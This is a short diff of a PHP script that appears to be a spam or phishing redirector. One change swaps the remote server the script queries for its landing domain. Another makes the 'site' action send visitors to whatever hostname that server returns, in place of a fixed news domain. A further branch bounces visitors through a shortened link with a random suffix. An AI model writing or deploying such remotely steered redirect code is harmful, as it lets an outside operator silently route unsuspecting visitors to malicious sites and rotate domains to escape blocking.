@@ -36,7 +36,7 @@
 	}
 	function getSite(){
 		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'http://gcndris.info/php/site.php');
+		curl_setopt($ch, CURLOPT_URL, 'http://porti.us/php/site.php');
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 		$site = curl_exec($ch);
 		curl_close($ch);
@@ -111,7 +111,7 @@
 		header('Location: https://goo.gl/vpZfUC?'.rand(11111,99999));
 	}else if($action == 'site'){
 		$app_site = getSite();
-		header("Location: http://beyzademhaber.info/$id");
+		header("Location: http://$app_site/$id");
 	}else{
 		@ob_end_clean();
 		@ob_end_flush();
